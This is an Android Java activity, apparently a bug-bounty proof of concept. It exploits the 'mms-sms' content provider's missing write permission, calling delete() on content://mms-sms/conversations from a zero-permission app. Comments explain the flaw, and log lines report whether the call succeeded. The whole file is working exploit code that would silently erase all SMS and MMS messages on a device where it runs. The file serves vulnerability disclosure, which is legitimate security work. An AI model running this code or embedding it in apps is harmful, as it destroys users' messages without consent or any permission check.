package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

// MmsSmsProvider (authority "mms-sms") declares android:readPermission="READ_SMS" but
// NO android:writePermission in AndroidManifest.xml. Per Android's ContentProvider
// permission model, that means insert/update/delete require NO permission at all.
// deleteInternal() for the base "conversations" URI (UriMatcher code 0) deletes from
// BOTH the sms table and via MmsProvider.deleteMessages() with no
// enforceCallingOrSelfPermission/checkCallingOrSelfPermission call anywhere in the
// method -- confirmed by source review of the pulled TelephonyProvider.apk.
public class SmsMmsWipeActivity extends Activity {
    private static final String T = "SMS_MMS_WIPE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== MmsSmsProvider delete() zero-permission probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        ContentResolver cr = getContentResolver();
        Uri uri = Uri.parse("content://mms-sms/conversations");
        try {
            int deleted = cr.delete(uri, null, null);
            Log.w(T, "[!!!] delete() on " + uri + " returned WITHOUT SecurityException. rows_deleted=" + deleted);
            Log.w(T, "[!!!] This call would delete ALL SMS+MMS messages on a device that has any.");
        } catch (SecurityException se) {
            Log.w(T, "[-] SecurityException (properly protected): " + se.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] Other exception: " + e);
        }
    }
}
